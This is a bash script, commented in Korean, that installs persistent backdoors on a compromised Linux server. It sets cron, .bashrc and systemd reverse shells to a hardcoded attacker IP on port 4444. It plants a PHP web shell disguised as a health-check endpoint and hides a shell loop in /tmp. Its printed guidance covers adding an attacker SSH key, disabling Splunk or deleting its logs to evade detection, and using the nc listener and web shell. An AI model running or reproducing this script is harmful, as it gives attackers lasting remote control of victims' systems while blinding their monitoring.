#!/bin/bash
# SSH로 서버 접속 후 실행할 백도어 설치 스크립트

echo "=========================================="
echo "백도어 설치 스크립트"
echo "=========================================="
echo ""

ATTACKER_IP="57.181.28.7"
ATTACKER_PORT="4444"

# 1. Cron Job 백도어 (가장 효과적)
echo "[1] Cron Job 백도어 설치..."
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 2>/dev/null") | crontab -
echo "[+] Cron Job 추가 완료 (5분마다 재연결)"

# 2. .bashrc 백도어
echo ""
echo "[2] .bashrc 백도어 설치..."
echo "bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &" >> ~/.bashrc
echo "[+] .bashrc 백도어 추가 (로그인 시 실행)"

# 3. PHP 백도어 (Splunk 우회용 - 다른 파라미터명)
echo ""
echo "[3] PHP 백도어 생성..."

cat > /var/www/html/uploads/health.php << 'EOF'
<?php
// System health check endpoint
if (isset($_GET['status'])) {
    echo "OK";
}

// 숨겨진 백도어 (Splunk가 모르는 파라미터명)
if (isset($_GET['check'])) {
    system($_GET['check']);
}
?>
EOF

chmod 644 /var/www/html/uploads/health.php
echo "[+] PHP 백도어 생성: /uploads/health.php?check=whoami"

# 4. 영구 리버스 쉘 스크립트
echo ""
echo "[4] 영구 리버스 쉘 스크립트 생성..."

cat > /tmp/.system_monitor << EOF
#!/bin/bash
while true; do
    bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 2>/dev/null
    sleep 60
done
EOF

chmod +x /tmp/.system_monitor
echo "[+] 영구 쉘 스크립트 생성"

# 5. Systemd 서비스 (부팅 시 자동 실행)
echo ""
echo "[5] Systemd 서비스 백도어..."

sudo cat > /etc/systemd/system/system-monitor.service << EOF
[Unit]
Description=System Health Monitor
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.system_monitor
Restart=always
User=www-data

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable system-monitor.service 2>/dev/null
sudo systemctl start system-monitor.service 2>/dev/null
echo "[+] Systemd 서비스 설치 (부팅 시 자동 실행)"

# 6. SSH Authorized Keys 백도어
echo ""
echo "[6] SSH 키 백도어..."
echo "[!] 공격자 SSH 공개키를 입력하거나 직접 추가하세요:"
echo "    echo 'YOUR_SSH_PUBLIC_KEY' >> ~/.ssh/authorized_keys"

# 7. Splunk 무력화 (선택)
echo ""
echo "[7] Splunk 무력화 옵션"
echo "    a) Splunk 완전 중단: sudo systemctl stop Splunkd && sudo systemctl disable Splunkd"
echo "    b) Splunk 로그 삭제: sudo rm -rf /opt/splunk/var/log/splunk/*"
echo "    c) Splunk 규칙 수정: sudo vi /opt/splunk/etc/apps/*/local/*.conf"

echo ""
echo "=========================================="
echo "[+] 백도어 설치 완료!"
echo "=========================================="
echo ""
echo "[!] 설치된 백도어:"
echo "  1. Cron Job - 5분마다 $ATTACKER_IP:$ATTACKER_PORT 연결"
echo "  2. .bashrc - 로그인 시 리버스 쉘"
echo "  3. PHP 백도어 - /uploads/health.php?check=명령어"
echo "  4. 영구 쉘 - /tmp/.system_monitor"
echo "  5. Systemd - system-monitor.service"
echo ""
echo "[!] C2 리스너 시작:"
echo "    nc -lvnp $ATTACKER_PORT"
echo ""
echo "[!] PHP 백도어 사용:"
echo "    curl 'http://43.201.154.142/uploads/health.php?check=whoami'"
echo ""
echo "[*] 5분 이내로 Cron Job이 실행되어 연결됩니다."
